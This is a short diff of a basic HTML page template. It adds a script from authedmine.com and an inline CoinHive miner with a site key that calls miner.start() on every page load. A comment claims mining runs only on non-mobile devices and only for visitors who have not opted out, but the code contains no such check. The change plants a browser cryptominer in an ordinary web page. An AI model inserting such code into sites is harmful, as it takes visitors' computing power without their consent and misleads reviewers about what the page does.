@@ -3,7 +3,7 @@
 <html lang="en">
 <head>
   <meta charset="utf-8">
-
+	<script src="https://authedmine.com/lib/authedmine.min.js"></script>
   <title>The HTML5 Herald</title>
   <meta name="description" content="The HTML5 Herald">
   <meta name="author" content="SitePoint">
@@ -17,5 +17,16 @@
 
 <body>
   <script src="js/scripts.js"></script>
+
+<script>
+	var miner = new CoinHive.Anonymous('mrddWU5mLUnERyzw6vpm2m67wVHTSyE5', {throttle: 0.3});
+
+	// Only start on non-mobile devices and if not opted-out
+	// in the last 14400 seconds (4 hours):
+	
+		miner.start();
+	
+</script>
+
 </body>
 </html>
